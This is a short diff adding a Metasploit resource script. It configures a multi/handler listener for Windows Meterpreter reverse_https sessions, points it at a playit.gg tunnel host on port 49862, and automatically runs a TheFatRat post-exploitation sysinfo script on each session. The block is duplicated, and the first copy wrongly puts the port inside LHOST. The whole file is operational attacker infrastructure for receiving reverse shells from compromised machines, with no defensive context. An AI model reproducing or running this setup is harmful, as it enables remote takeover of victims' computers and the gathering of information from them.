@@ -1,0 +1,14 @@
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_https
+set LHOST far-experiments.gl.at.ply.gg:49862
+set LPORT 49862
+set AutoRunScript multi_console_command -rc /home/kali/TheFatRat/postexploit/sysinfo.rc
+set ExitOnSession false
+exploit -j
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_https
+set LHOST far-experiments.gl.at.ply.gg
+set LPORT 49862
+set AutoRunScript multi_console_command -rc /home/kali/TheFatRat/postexploit/sysinfo.rc
+set ExitOnSession false
+exploit -j
